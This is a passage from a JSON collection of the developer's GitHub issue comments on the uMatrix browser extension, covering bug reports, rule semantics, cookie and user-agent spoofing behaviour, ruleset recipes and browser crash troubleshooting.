{
    "gorhill": "This was caused by the domain expander. There is still one case in which the domain expander will cause the popup to be resized, but there is nothing I can do for that one: if a row is collapsed and last in the list, hovering over the domain name will cause the expander widget to appear and since it is positioned slightly offset downward out of the parent (by design, to emphasized it acts on following rows), this will cause the overall popup html to be resized to accomodate the new overall html size.\n. The manifest is in there. Maybe because I changed the folder name to which the extension unpack?\nThe project's directory tree is restructured to make it more portable, as per input of someone who is working on porting uBlock to other platforms. So I follow the inputs and try to make uMatrix more friendly toward porting to other platform. I think it's long overdue this project here makes it to firefox. I may no be the one doing this in the end, but I will do whatever needs to be done to make it easier, and one of the requirement is the new structure.\n. Not sure what happened, issue erroneously duplicated.\n. Yes, that is a bug, probably introduced when I removed jQuery dependencies. Explicit rules are not supposed to be hidden.\n. Actually I did not address the google.com part. I think I need to also bring this back like it was in HTTPSB, it's more logical.\nUnlike HTTPSB though, I don't want to duplicate the rows.\n. I just unzipped the package and installed and there is no error. It is as if there is a source with a javascript syntax error. Can you scroll up the console and show me the first lines instead?\n. Ok, I removed code to hold back the request handler, I need to hold it back until all is installed. I will just do it differently his time, it was kind of clunky before. I suppose you had something net requesting while you enabled uMatrix.\n. > Should it be \u00b5m.scopeFromUrl(....) instead of this? When I changed it the error went away\nThanks for spotting this, good code review. I don't actually need to call this function anymore as in HTTPSB, the page hostname is always used now.\n. I had referer-removal disabled, hence I couldn't repro the bug.\n. First one can happen in normal circumstance when behind-the-scene matrix blocks the requests used by uMatrix to fetch remote resource, or if there is no network connection.\nSecond one is yet another thing I missed to revise when I imported code from uBlock.\n. Ah yes, I miss the entry in messages.json for the first one.\n. Done: https://crowdin.com/project/umatrix\n. Ah yes, the same issue as in uBlock, extensions are now forced to clear up lastError by merely reading it.\n. Works as expected.\nYou un-whitelist (graylisted) locally a globally whitelisted request, so that means two rules:\n- 1 for the global whitelist\n- 1 for the local graylist\nRemember: all rules from broader scopes are seen by narrower scopes. Without the second rule, github.com collector-cdn.github.com would be dark green.\n. Argh, wrong bug number, I meant to tag with #15.\n. > Step 3: revert step 1. Shouldn't rule count be 1 now?\nMy answer is the same as here. I don't know how else to explain it more clearly.\nI rather you explain to me how a cell in local scope can be graylisted without an explicit rule when the same cell is whitelisted in global scope.\n. Now you are bringing a different case, which requires a different explanation. You changed back the global rule to match the local one. Theoritically, the local one is not needed anymore. In practice though, uMatrix can't just go back a remove all the now apparently useless local overrides, because:\nA user could quickly put back the global rule for whatever reason (removed by mistake, changed his mind, etc.), and in such case if uMatrix had removed all the apparently useless local rules, a user would silently lose the override in all local scopes where there is one.\ninherit means the cell is graylisted and its block/allow state will be inherited from neighbouring cells just like in HTTPSB. inherit is the default when no block/allow rule are in action, but sometimes it has to be explicit to override a block/allow rule of the same cell in a broader scope.\nI am trying to come up with a slight visual hint that a cell is explicitly graylisted -- there is currently none. I will be experimenting with some ideas of visual, as currently this can lead to confusion.\n. Actually, I will also be renaming inherit to xy-inherit to reflect more accurately what it is about.\n. Strange. I can not repro, and code reviewing I can't see where this could happen. The only thing I can think of is that 503 is not considered as an error when using a XHR, and thus the error path was not taken by uMatrix, and thus it ended up loading a 503 web page as a hosts file.\n. Fixed with b946a96bb66dd8d6dbba8850a0594e3cab544c69.\nI need to also import the fix in uBlock, this might actually explain why some users report uBlock stopped blocking ads: if EasyList could not be downloaded the same way it happened above to hpHosts, that would cause uBlock to not see the failed request and interpret the error page as a valid EasyList file.\n. It's just to be on the safe side in case it is undefined, in which case typeof this.status would return 'undefined'.\nOf course I went to look at 503 code spec before the fix...\n. I decided to select whatever the user selected last time. There is more than one narrower scope: there is the domain-level, and there is the full hostname-level. If I chose to select a narrower scope at all time, which one would that be? It's kind of arbitrary. In the end I decided I will just go with whatever the user selected last. Who knows, maybe some users will always work in the global scope, so this way I won't impede these (unlikely) users.\nBut I can get confused myself at time. I am guessing users will always stick to domain level mode (optimal convenience-wise), so that should not be too much a problem. For now anything else seem to have more bad consequences IMO.\n. Yes, I disconnected the handling of cookie while I re-factored, forgot to plug back the code. I step through the code and cookies are removed, not sure what the problem is in HTTPSB.\n. Like I said, the cookie cleaning code is not working, I did not release a version yet with it working again. I am testing this one thoroughly given the re-factoring of the matrix.\n. Forgot to rename request types of HTTPSB to normalized ones I use in uMatrix.\n. They look fine here. What browser/version are you using?\n. I just mindlessly copied from uBlock.\n. > Maybe you don't have any idea to add such feature ?\nYes I have an idea, and no I do not need to look at anybody else's code.\n. Done.\n. I could reproduce: it happens if the matrix updates while open. Some rows then get reused in a different way than they were before the update, and some of their properties are not cleared when reused as a blacklist meta row.\n. Yes, just spotted this too, forgot to fix that one cell.\n. Dammit... There is still a problem with counts when I refresh from within matrix...\n. Looks fine from here, it tells me I've blocked over a 1,100, and that is after I restarted the extension two hours ago.\nThings that can cause uMatrix to not see many cookie headers to foil:\n- You have \"Block third-party cookies and site data\" selected\n  - It is not selected on my side because I want to test\n  - It is better if selected, even with uMatrix, because this also takes care of all sort of site data, not just cookies.\n- Cookies are allowed for 1st-party\nIf you have the two conditions above reunited, there won't be any cookie header to foil.\n. > confused as to why HTTPSB reported them blocked and \u00b5Matrix does not. I suppose this is due to a difference in code between the two\nThe code for that part was not really touched. Are you blocking 1st-party cookies in HTTPSB?\n. This has been the case since HTTPSB: when the matrix refreshes, the hotspots are removed from the cell under the mouse, so we need to move the mouse pointer again for the hotspots to be re-inserted in the cell.\nI could probably remember the specific cell hostname/type into which the hotspots are installed before updating the matrix, and re-install them.\n. Observations so far:\n- There are no script tags in http://www.kalifornien-tourismus.de/.\n- The links are prevented from loading because they try to load the target into another frame on the same page (1990's design), so I have to find what keyword I need to add to the sandbox directive.\n. Adding allow-popups to the sandbox directive makes the links work. However, they each open in a new tab, while normal behavior without uMatrix is to open in another frame on the page.\n. I don't see a solution for the side-effect, it appears merely using a sandbox directive -- needed to prevent execution of javascript -- prevents links to open into their intended target frame object. From CSP's point of view, a target property on a link is akin to javascript trying to execute.\n. Regarding 4:\nI don't think hyperlink auditing is in widespread use currently. But Google does use it when you click on a link in a results page, and I confirm they are reported in the stats.\nGive me a URL where you think they are in use, yet not reported by uMatrix, I will investigate.\n. Regarding 3:\nThe strings are already in messages.json. ~~However I may have removed their use, because I think I remember vaguely that some of the translations were causing the matrix to be all visually broken: the strings have to fit in the small cell.~~ They are already in use in the matrix: https://github.com/gorhill/uMatrix/blob/master/src/js/popup.js#L950.\nEdit: Ok I see they are not. Will investigate.\nEdit: Ok found the problem, an attribute name change. Will see how it goes with the various translations over time.\n. I will use a different approach than with uBlock though, as per @Deathamns' input: using @@bidi_ makes the code non-portable. It can be avoided with a mix of simple CSS/JS.\n. So I am going to try and fix this today. There are things I am not sure about how it should render for RTL languages, like the matrix:\n\nShould the top toolbar be exactly reverse-ordered (i.e. scope selector to the right, etc.), or should I keep the exact same order?\nAlso, what about the matrix columns, exact same or exact reverse?\n. Re. \"middle\". This is what I have on my side when using \"he\" locale:\n\n. Difficult to solve. There is a limit on how wide a popup can be. When using the setting \"Large font\", the popup is very close to the limit, and we have to be sure we don't beyond this limit, or the matrix will be all broken, i.e. no longer a matrix visually.\n. I will experiment with CSS transform tricks when I have time, but I won't hold from \"shipping\" for now.\n. For translators:\n\n. > Are you sure you don\u2019t need to invalidate the 3 additional\nIt's what I meant to do yesterday when I updated the file, but apparently I did it wrong. Do you know how this can be done without having to go through all translations?. > Seems you forgot to add the tooltip for that.\nThere is no tooltip for buttons which serve dropdown menus -- the tooltip would interfere with the content of the dropdown menu visually.. First line is name of ruleset recipe.\nSecond line is condition for recipe to be a hit to current matrix:\n- First must match source hostname (the current site's hostname).\n- Second must match one of the destination hostname (one of the 3rd-party in the matrix).\n- * means match any.\nThe rest of the lines are rules to be imported, only on a per-need basis (if internally the associated cell is blocked). allow is implicit (I didn't see the point yet to block more stuff on top of default-deny).\nAt this point this all need to be field tested for me to adjust as necessary.\n\nAre global recipes allowed?\n\nI don't think I forbid it but I don't see the point, only users should be able to allow non-specific rules.\nI am currently trying to come up with a UI to easily enter inline recipes, to be able to quickly test recipes, to encourage contributions.. @anewuser @warnellw @ArchangeGabriel @pwd-github \nYou have been contributing with ruleset recipes, and as I am trying to come up with clear guidelines about how recipes should be crafted, we should centralized here all the discussions about this. I have been thinking more about all this and with the feedback I changed my mind about some of what said before, including changes that I required. For now I roughly assembled \"Contributing ruleset recipes\", feel free to discuss/comment/modify.. > I don\u2019t understand if and then why if only scripts are need there should be an * rule\nThat's it, that is one of the point for which I changed my mind, hence the passage:\n\nFor any given 3rd-party, if only one type of request is needed, then the rule should allow only that one specific type.. > I don\u2019t see why allowing xhr and script at the same time would require an * rule technically\n\nTo minimize ruleset. With out of the box ruleset, a rule with type * will be picked. Then the recipe manager will process the script rule, and when it sees that scripts are already allowed (because previous * rule), it will skip the rule. And so on for all following rules.\nConsider:\n_ somecdn.com *\n_ somecdn.com script\n_ somecdn.com xhr\n\nWith out of the box ruleset, the recipe manager will just end up applying _ somecdn.com * allow, which will cause script and xhr to both become allowed. Result is one single rule for both.\nIn the case where scripts are blocked everywhere by default, the recipe manager will end up applying _ somecdn.com * allow and _ somecdn.com script allow.\nIn the case where someone blocks all scripts and xhrs everywhere by default, then there will be three rules applied, but I expect that sort of cases to be an edge one, and whoever confirgure uMatrix like this is probably less likely to need the help of recipes to unbreak sites. . Need a tool to one-click snapshot the rules in current popup panel into a temporary recipe in a sort of scratchpad which can then be edited/tested on the spot. The current way of creating/testing recipes is tedious.. > offers no way to disable a recipe\nRecipes are not an on/off thing, it's a set of rules which are imported into your own ruleset. You may have already some allow rules which are meant to be toggled on by the recipe, so of course it would be bad if uMatrix was removing rules you already had set on your side before importing the recipes.\n\npadlock buttons next to recipes names are redundant\n\nThey are not. Some recipes may import rules which are not visible in the current scope, and without that extra padlock it would be impossible to easily save these out of view rules.\nThe purpose of recipes is that of convenience, to easily import rulesets -- they must not be seen as more than this. Users are still completely responsible for whatever rules they agree to import as part of their own ruleset.. @aleksejrs Firefox does not allow extensions to read from file:/// URLs. I suggest you create a Gist and import its URL, that should work. Another option is to enable the advanced setting contributorMode, this will add a textarea widget in the Assets pane which purpose is to add inline recipes.. > My version:\nHow did you look at the content of your version?. I don't change the version -- it's for the parser to use, it will stay the same unless the format of the recipes changes.. > If you go to another tab on the dashboard and back to Statistics its still shows 0 instead of the # from step 3\nMaybe a bug introduced when I removed jQuery dependencies.\n. Actually, I went and tried to repro: it worked all fine. After I set \"50\", clicked Refresh of course nothing showed since log is empty because of step 1), went to another tab, came back, \"50\" was still there. Did I misunderstand a step?\nEdit: Never mind, I followed more thoroughly your steps, and I could repro.\n. Ok it's because I cache the user settings on that page and I do not update the cached values with the new value, hence no change is seen when reverting back to the same original value.\n. uBlock is pattern-based/cosmetic-based filtering (EasyList etc.), while uMatrix is matrix-based filtering. Any one of them can be used standalone, hence why some of the preset lists are the same (uBlock supports hosts files). They are not specifically made to run together, but if they are, unchecking malware-related hosts files in uBlock is suggested to avoid unneeded overlap.\n. There are significant differences aside the ones you mention.\nMatrix-based filtering and its inheritance model (cell/rows/columns/scopes) can't be obtain with uBlock. uBlock follows ABP-filtering semantic, which is very simple:\n- Allow everything\n  - Unless there is a matching block filter\n    - Unless there is a matching allow filter\nThen it stops there. You can't override beyond this.\nThere is no such restriction with matrix-filtering, it is fully hierarchical with no limit, and since it's written from the ground up this way, it far more efficient than pattern-based filtering. However, a higher granularity can be obtained with pattern-based filtering. So they complement each other in a way.\nBut a majority of users just want an install and forget blocker, and this is uBlock. Power users however like to be fully informed about what web pages do, and be able to act on that information with a tool that makes it all easy, this is uMatrix.\nJust like RequestPolicy can't fully replace Adblock Plus and vice versa, and using one doesn't prevent using the other.\n. > Any chance of the element hiding capability of uBlock/HTTPSwitchboard making its way into uMatrix?\nThere is a chance of adding a hiding capability, but that won't be the one linked to cosmetic filtering (also know as ABP-element hiding filters.)\nI could however add the hiding of blocked net requests, something which is completely independent of ABP filtering. That code is also in uBlock, and I think it would be pretty straightforward to import and adapt it to uMatrix.\nBut it is no fancy \"element hiding\" as a result of cosmetic filtering: the hiding would apply after the page has loaded, thus there is a chance of flickering on the web page.\n. Can you open a separate issue for this? Actually copy/paste the thumbnails too, it shows well why hiding is needed. Thanks.\n. Both tools can be used alone or combined. It is assumed that whoever use these tools will figure by themselves how to use them best together -- this is especially true for users of uMatrix since it is made for advanced users, so they can figure how to set up things themselves.\n. I did it this way on purpose. Usually the point of blocking images is to prevent them loading to save bandwidth, not to change the look of a page. If I was reloading, more bandwidth would be consumed. I think not reloading is the safest bet as to what a user want. \nWhether to reload or not depends on what goes from blocked to allowed, or allowed to blocked. For scripts, blocking or allowing will always cause a reload. For images, only blocked to allowed will cause a reload. Etc. It depends of the type, and the direction of the transition blocked-allowed.\n. Related HTTPSB issues for context: Option to prevent page from reloading after change\n. > the description was sort of misleading\nIt's true that the description says \"display\". I guess we should adjust the description.\n. Yes that one is definitely a regression of the removal of jQuery dependency. \n. Allowing just the following worked for me (assumed 1st-party row is with out-of-the-box settings):\npastebin.com www.google.com script allow\npastebin.com www.googleapis.com script allow\nYou can paste the above lines into the rules editor:\n- Go to \"My rules\" in dashboard\n- Click Edit button on the right-hand pane: a freely editable textarea appear.\n- Copy/paste the above lines in the textarea\n- Click Save\nThis should now work.\n. By the way, uMatrix do not guarantee sites will work fine: it is for advanced users who can figure how to unbreak sites, because essentially uMatrix is a firewall which works in deny-default mode out of the box: it is expected sites will break.\nSo this means from now on I will close bugs which report broken sites when the sites are broken through normal use of uMatrix.\n. I get proper results without www.google-analytics.com. See above.\n. @my-password-is-password Yes, looks like ||google.com/cse/ is a problem if using \"Fanboy\u2019s Enhanced Tracking List\u200e\" in uBlock.\n. @Skibicki No problem. I am not mad at you, this just made me realize I had to warn about this because given how easily uMatrix can break sites, the pile of issues would grow out of control if I didn't clarify this asap.\n. > Is there anybody else affected by this problem?\nMe. I need to look into this, I think I had the same problem in HTTPSB, so there is something in there in the cookie management which causes ovezealous deletion of cookies (I'm guessing).\n. What is your settings for session cookies?\nI put in tracing code, and so far no session cookies have been deleted.\n. Ok, I just had a cookie deleted for crowdin.net (not crowdin.com), and then I checked and noticed I was logged out. My crowdin.net cookie is blocked, since it is not 1st-party. So that could be a problem of how Crowdin site is designed. Will repeat and see.\n. I think it was just a fluke: I block 3rd-party cookies, so no way 3rd-party crowdin.net could set a  cookie while browsing crowdin.com. Maybe just a leftover cookie for when I was testing while allowing 3rd-party cookies/site data.\n. Ok, I just noticed I was logged out again, and no cookies were deleted.\n. Could it be that thing: https://mc.yandex.ru/metrika/watch.js?\n. Wondering if it is UA-spoofing. I haven't found anything so far done by uMatrix: site cookies are not removed, site local storage are not cleared. Maybe the site uses UA string as an extra variable to determine whether a user logged out. That would be a smart move to help foil attempts at break in.\n. Ok it seems UA-spoofing is the problem: I am no longer being kicked out (so far) after I disabled it.\n. > Or would it be possible that \u00b5Matrix does not apply a new UA for sites currently loaded in a tab?\nNot really. A \"site\" from uMatrix's point of view is a distinct URL, so that would not work. There is no data structure internally for \"site\".\nI was thinking more of a per-scope switch to override global setting. This would fit well in the current infrastructure with a bit of rework which is needed anyway to address similarly #7.\n. Ok we need to stick to uMatrix here, I am having a hard time making sense of what is reported. uBlock is rather different than uMatrix internally, and it is confusing me more if you report both -- which have different behavior -- as a single issue.\nI did see there was a problem with uMatrix not updating its badge. I think I got it fixed but I need to known exactly if this was the issue you reported, for now I can't figure exactly what you are reporting with uMatrix. Can you remove all references to uBlock so that I can clearly see what you are reporting with uMatrix?\nTo save time, regarding 6): uBlock may block more than what appears in the request log, because it is not uncommon for the same net requests to be fired more than once. So each time a specific net request is blocked it is counted as +1, even though it will be reported once in the request log. That would be impractical to repeat the same URL many times in the request log.\n. Ok, so at 5)-6) this is what I fixed: the badge wasn't updated. This was a case of the URL changing in the address bar, but no document load occurring.\nRe uBlock: it works quite differently than uMatrix. In uBlock, the stats are not reset when the URL in the address bar changes, they are reset when a new document is (re)loaded. Resetting uBlock stats whenever the URL changed was really annoying in some heavy cases of pages which change incrementally. Best example is Google Maps.\nCurrently uMatrix is completely URL-based, so whenever the URL changes, a new internal data structure to hold matrix stats is created. This is annoying on site such as Google Maps. I think I may need to revise that to be more like uBlock, i.e. reusing internal data structure when the URL is updated without the main doc in the page being reloaded.\n. Oops, the second fix hides the first fix.\n. They assume being launched from the project's root directory, I think that is reasonable.\n. I will look further into Deathamns changes to uBlock, he made it so that you can simply install without having to build first.\n. Closing by design.\n. Crashes need to be reported to Chromium devs: javascript does not crash, the browser crashes.\nDo you have an anti-virus which could interfere with the browser? If so, which one? I think I remember somebody reporting something similar, when restoring settings.\nReporting to Chromium devs is what needs to be done.\n. If you report to Chromium devs with detailed repro steps which causes the crash every single time, that will help them spot the problem and fix it. It's all in the repro steps.\n. If you can reproduce at will, I would like to change something and see if I can workaround the browser bug.\n. I tried to repro with Google Chrome 40, and it worked fine on my side. So might not be as easy to repro.\n. Would be nice to know which flag, so if ever someone else get the problem, I can ask whether the problematic flag is enabled.\n. > I re-enabled those flags again and it doesn't crash anymore\nWhich version of uMatrix? Note that in the latest version there is a blind attempt at workaround: 1d9a8e18e829d23a8fd2469a93a494adf94bdb00. My thinking there is that maybe I should avoid restarting the extension while being called back from within a storage-related API context. The problem is defintely in the browser, however if I can find a workaround I will do it. uBlock reportedly suffers also from similar problem.\n. > uMatrix.chromium-0.8.0.0-rc.1\nYou could try with 0.8.0.0-rc.0 and see if it's back crashing.\n. > Ok it crashed going back to 0.8.0.0-rc.0\nAwesome. That's the kind of narrowing the Chromium devs will find useful. So since uBlock shares the same code here, this should be reported in the uBlock issue: https://code.google.com/p/chromium/issues/detail?id=418174\n. > So its not a uMatrix problem\nCrashes are never an extension problem -- it is just scripted language. But extensions can try to work around browser crashes -- until the browser is fixed.\nSo if I understand: some flags cause the crash, and the lottery-like workaround had nothing to do with the crash not occurring anymore?\n. I tried to reproduce the crash on Windows 7/Google Chrome 40, and I could not, including with the flags.\nI wish I could because this needs to be reported to the Chromium devs, that kind of hard crash could even be a security vulnerability. Could it please be narrowed to which flag(s) are required and report to Chromium devs? \n. > Can reproduce every time.\nOddly enough, I can't reproduce using these steps, neither on Chrome 40/Windows 7.\nI think at this point posting your video and a crash report (this will allow the devs to know where it crashed in the source code etc.) is best move. Once you add the issue in ~~the chromium thread~~ a new chromium thread, I will pitch in to point out where in the extension code this occurs.\n. When you say \"after some time\", what do you mean exactly?\n. When I closed the web pages, they disappears from the drop down menu after 10 seconds. I am going to need more details to repro.\n. Works all fine here.\nBrowser? version?\n. If you enter in the extension console:\nObject.keys(\u00b5Matrix.pageStats).join('\\n');\nAfter you see the over-populated list, what do you get?\n. Actually, that's not the right dict to look at, that one is longer term. The one used for the lists is:\nObject.keys(\u00b5Matrix.pageUrlToTabId).join('\\n');\n. There has to be something specific in your environment, I can't reproduce. Entries in that dict above are removed when the function in start.js line 96 is called, whenever a tab is removed.\n. > not a big deal anyway\nOf course it is a big deal. We have to find out why this happens. Can't you breakpoint at start.js/line 102? If I could repro I would do it, but I can't for whatever reason.\n. The tab ids are fine. I would like to understand why \u00b5Matrix.unbindTabFromPageStats in tab.js is not called with these tab ids.\n. Yes, something I need to fix since a while now, mapping page URL to tab id doesn't make much sense given a single URL can be opened in more than one tab. I have to track down all the places in the code which make use of \u00b5Matrix.pageUrlToTabId map, directly or indirectly, and fix these places.\nI don't think I will hold back releasing for this though, due to time constraint I can get into large code changes for now, and given this problem was also in HTTPSB and yet never reported, I guess we can live with this for now. ~~A simple F5 refresh for now should revive the entry I expect.~~ No it doesn't, because \u00b5Matrix.pageUrlToTabId. Need to close and reopen the tab.\n. > And wired.com is in statistics here\nDepends which tab you close first.\n. Typos fixed in 197bca19151085c135f9c6000e14efd14984160e.\n. Ok this sucks, for whatever reason Crowdin obliterate the edited sentences rather than just un-validate them. I end up trashing other people's work\n. I see the requirements, I will keep this in mind. I usually prefer to do my own thinking about how to implement suggested features.\n. https://github.com/gorhill/httpswitchboard/issues/133\n. Of interest: https://developer.mozilla.org/en-US/docs/Web/CSS/text-overflow\n. Believe me, I played a lot in a distant past with all this.\n. I don't see anything in the log after setting to zero. What are your steps?\n. Works from here. What browser/version are you using?\n. \"Disable extension\" from the chrome://extensions/?\n. I tested and as soon as I disable the extension, this code is called, which update the setting, hence it is applied. I am testing with Chromium 37. Maybe they changed something in 39.\n. I tested on Google Chrome 40 Windows and it also works fine.\nDo you have any flags set? Like enable-fast-unload? There seems to be something specific to your environment, as I can't reproduce on Chromium 37, neither on Google Chrome 40. Maybe someone else can confirm.\n. Wait a minute, I just noticed entries in the request log despite being set a zero. I can make it happens whenever I opened a new blank tab.\n. Closing: Self-explanatory wins over completeness.\n. @Deathamns work on the vAPI/Firefox port shows that uMatrix may be closer to a Firefox port than I thought. This and the presets are at the top of the list of high-priority issues.\n. Done.\n. Looks like all links https://raw2.github.com/ must be changed to https://raw.githubusercontent.com/\n. Reference benchmark, end of first run:\n\u00b5Matrix> onBeforeRequest: 0.156 ms (4821 samples) profiler.js:51\n\u00b5Matrix> onBeforeRequest: 0.155 ms (5042 samples) profiler.js:51\n\u00b5Matrix> onBeforeRequest: 0.155 ms (5093 samples) profiler.js:51\n\u00b5Matrix> onBeforeRequest: 0.155 ms (5199 samples) profiler.js:51\n\u00b5Matrix> onBeforeRequest: 0.155 ms (5271 samples) profiler.js:51\n\u00b5Matrix> onBeforeRequest: 0.155 ms (5337 samples) profiler.js:51\n\u00b5Matrix> onBeforeRequest: 0.155 ms (5385 samples) profiler.js:51\n\u00b5Matrix> onBeforeRequest: 0.155 ms (5517 samples) profiler.js:51\n\u00b5Matrix> onBeforeRequest: 0.154 ms (5648 samples) profiler.js:51\n\u00b5Matrix> onBeforeRequest: 0.154 ms (5702 samples) profiler.js:51\n. I am going to need more specific details. What are all the rules in the global scopes? What are all the rules in the specific scope where this happens? A URL where the problem shows up.\n. I went to www.tomshardware.com and I confirm images from media.bestofmicro.com are loaded, because images are whitelisted in global scope. So it works from here. The matrix displays exactly what happens to network requests, it's the same exact code used for both the matrix visual and the evaluation of net requests.\n. > My site-specific scopes have been removed\nI can't make sense of this. You can't \"remove scopes\", there are no scopes like in HTTPSB in \u00b5Matrix. You can however remove rules belonging to a specific scope. The scope selector in the matrix is only a UI thing, to tell where a rule should be created/removed. All net requests are always evaluated starting from the highest scope according to the hostname of the net request.\nI need to see your rules.\n. Ok, so you removed * * doc allow. This one is important if you want pages to load. doc is the root document. If it is not allowed, nothing will load.\n. cloudfront.net is a Public Suffix, meaning x.coudfront.net is not under the same administrative authority as y.cloudfront.net, the same way x.co.uk is not under the same administrative authority as y.co.uk.\nThe matrix won't encourage people working below effective domain names. But you can manually enter * cloudfront.net * allow in the \"My rules\" tab if you want to blanket-allow cloudfront.net.\n. I see it fine from here:\n\nStrange. bp.blogspot.com should not be at the top in your screenshot.\n. If you right-click on uMatrix icon in the toolbar, and click \"Inspect pop-up\" while on the problematic page, can you tell me if there is an error message in the console of the dev tools window which will open?\n. > The domain is listed as \"com.ar\" in the dropdown. Which is not correct\nThat's a symptom of the Public Suffix List not being properly loaded. Do you have errors reported in the background page of the extension? (available when \"Developer mode\" is activated).\n. Actually even commenting out the loading of the PSL, I don't get your screenshot (I do get com.ar as a scope). Where did you install uMatrix from? The store or the release on Github?\n. I am looking at the code and I don't even see how it is possible for the 1st-party row to not show up, and for the 1st-party domain, periodicotribuna.com.ar, to be relegated in second position in the matrix: These two are hard-coded to always appear first.\nDid you modify the code?\n. I tried your backup and it works fine from here. I'm out of idea about why uMatrix exhibits this behavior on your side.\n. What browser/version? Do you have any browser flags not in their default state?\n. What other extensions installed?\n. I do not have auto-update enabled, so I will enable it and keep an eye open to see if I can reproduce this bug. I don't see how the PSL could be improperly loaded since the extension ships with it. So maybe something in the auto-update messed up with its loading/parsing into memory.\n. > It only happens when a tab is opened at the browser start\nOk, I reproduced.\nThat annoying problem when pages load before an extension is fully loaded. Will investigate how to solve this specific problem here.\n. Related issue in uBlock.\nMy idea of an implementation would be to report requests blocked by any other extensions, not just uBlock. Installing a handler in webRequest.onErrorOccured which would look whether the request was blocked by self, and if not, report it as blocked by \"something else\".\nHowever, this would add an overhead for every blocked requests (not for non-blocked requests though), because such blocked requests would end-up being evaluated twice against the matrix. Not sure whether this added overhead is really an issue, I have to investigate before implementing such solution.\n. Looks to me like someone started to translate one of the page to Chinese. I'm fine with this.\n. I will transform the current referrer removal setting into a per-scope switch, with no complicated logic. So a user could enable referrer removal in global scope, thus it applies everywhere, and if ever a site breaks due to referrer removal, then it would just be a matter of disabling referrer removal for that one scope.\n. @CODYQX4 I would prefer we do not collapse many issues in one, or else they won't ever get resolved. The original issue here is to have referrer-spoofing on a per-scope basis, and this fits nicely in the current infrastructure.\nYour issue is something else, which cannot be solved in the current state of uMatrix -- per-scope switches are binary, not multiple-choice lists. I am not even sure I will even agree to \"fix\" this. I don't really see the point of using the plain referrer's host as a replacement of a referrer's full URL, this still leaks too much information for my taste, to the point of seeing this as not very useful. Might as well just disable referrer spoofing IMO.\nThe goal of uMatrix is not the replace all add-ons out there. To just be able to foil referrer information per-scope (as opposed to globally like before) is good enough I believe. Anything more will need specialized add-ons. Same goes for \"blocking cookie on a per-cookie basis\" or anything that actually requires a whole UI dedicated for just one narrow purpose.\n. In the example you give, Google already know you searched for \"\u00b5Block\", does it really matter that it will know which link you clicked?\nIf it comes to this kind of worry, the proper solution to me is to use startpage.com, duckduckgo.com or whatever is deemed more private, or to disable javascript, or another add-on which purpose is to deal with this kind of specialized feature, as you say if possible at all.\nPlease, let's not turn uMatrix into a model of how to write bloated software. That kind of feature is rather remote from \u00b5Matrix.\n. Tampermonkey?\n. You have a test case I can use to reproduce? A URL?\n. This used to work. I fixed a problem with the messaging code, but it still broken. I can't make sense why, as using tracing code I can see that the spoofed navigator is correctly inserted, but for I don't know what reason, the old one is not being replaced. I will investigate more tomorrow.\n. Chromium issue:\nWindow.navigator is immutable, did not used to be\nI would like to understand the explanation (or \"explanation\") behind this change...\nI invite the users to star this Chromium issue (there is a star to the left of the issue number), not sure it will do something, but if only to show people care about features which enhance privacy. I really need to have a Firefox version of uMatrix, this is what happens when we depend on one single browser.\n. So currently, UA spoofing is rendered rather useless, unless one disable javascript by default, which is not a very realistic workaround.\nEdit: Actually, blacklisting globally XHR while leaving 1st-party javascript whitelisted can also work to defeat browser sniffing. Along with block-all/allow-exceptionally, this is not too bad.\n. > You mean navigator.userAgent cannot be spoofed?\nNot anymore. It definitely used to work, but this was changed for I don't know why. Your other add-on will also not be able to overwrite navigator.userAgent. You can check with above-mentioned Browserspy link.\n. @eduardoeae You're right, it works. Looking at the code, I see it defines getters for each property, while on my side I try to replace wholesome the window.navigator property. What Chameleon does is certainly better than what I tried to do in uMatrix. I will ask the author if he wishes to contribute his UA-spoofing code to uMatrix.\nSo it's as if the navigator property on the window object itself cannot be changed, however it's possible to set up getters on the window.navigator object to override the existing properties.\n. Just adding one line to define a getter fixes the issue. I will stick with that, importing directly from Chameleon looks like would be way too much work.\nWhen I wrote that code a long time ago I had never looked into getters. I started to use a getter() with uDom and found this pretty cool. Using getters for UA-spoofing is definitely the better approach, that will simplify the code I had written a long time ago.\nI never stop learning.\n. Not sure how it works on Windows, but on Linux the browser settings are saved into the user's Home folder. So if I manually install the extension where everybody can access it, there won't be any sharing of the settings. The settings are not saved in the extension folder. The path has to be the same just so the browser knows it's the same extension, and probably uses a hash of the path to lookup where to save/retrieve extension settings in some internal database.\n. > Even if I turn it off\nHow do you turn it off? Be detailed please. Also, what are the states of the other switches, \"Strict HTTPS\", \"User agent spoofing\" and \"Referrer spoofing\"?\nAll the switches are independent of each other, so even if you turn off matrix filtering, you still may have to turn off any or all of these switches as well. For example, \"User agent spoofing\" kind of break crowdin.net, so it has to be turned off for this site (#36).\n. > \"Strict HTTPS: forbid mixed content. \" that was messing with it.\nInteresting. I don't have a groupme account, but if I had one I would be curious to know which resources are pulled using an unencrypted connection while on an encrypted page. You can find out using the developer console (as documented here).\nSo anyway, the nice thing with the version you are using is that you can turn off \"Strict HTTPS\" only for groupme, so you keep the benefits everywhere else.\n. > blocked by \u00b5Matrix and red lines\nDid you remove all the rules manually in the \"My rules\" tab? There is a rule in there which is important, and removing it will cause the symptom you describe:\n\n* * doc allow\nThis rule applies to the root documents. If you remove it, all root documents will be blocked as you describe. It cannot be toggled from the popup matrix, as there is only one such request per page, thus pointless to have it take space in the matrix.\n. Ok, I've hard-coded the * * doc allow rule into the matrix filtering engine, as this is the second occurrence of a user deleting it (other occurrence: #53). The one appearing in \"My rules\" can be deleted, but the one hardcoded will serve as fall back in case this happens.\n. > syncing isn't possible due to the limited amount of space google gives extensions to sync data\nActually, with uMatrix this is now less of an issue, given that ruleset syntax is now specific to uMatrix. With HTTP Switchboard, a user could squarely cut and paste into it's custom filters the whole content of Fanboy Ultimate (for example), which would of cause the sync limit to be broken. I didn't try but if a user tries the same now, the resulting ruleset once parsed will be empty.\n. > to synchronize some text files\nSettings are saved into storage provided by the browser, through a browser API. Extensions are not allowed to create files on a user's file system (for good reasons).\n. The latest dev build support Chromium/Firefox sync for rules.\n. > but then my previously-sync'ed rules would get overwritten!\nIt's a Firefox caveat, spelled out in the doc:\n\nA new installation of uBlock Origin will cause cloud storage data to be blanked.\n\nBugzilla: https://bugzilla.mozilla.org/show_bug.cgi?id=753289. Apparently fixed in latest Nightly, I did not try for myself the fix.\n. I would expect the \"import\" button to become available as soon as uMatrix sees there is data in the cloud (sorry for buzzword). Currently it's not showing in your case because the new uMatrix install zero-ed the cloud storage content, and thus sees nothing available for download.\n. Ok good then I will keep the feature in.\n. ~~Does Poper Blocker really break the pages? From what I can see, the requests through non-encrypted connection were not allowed in 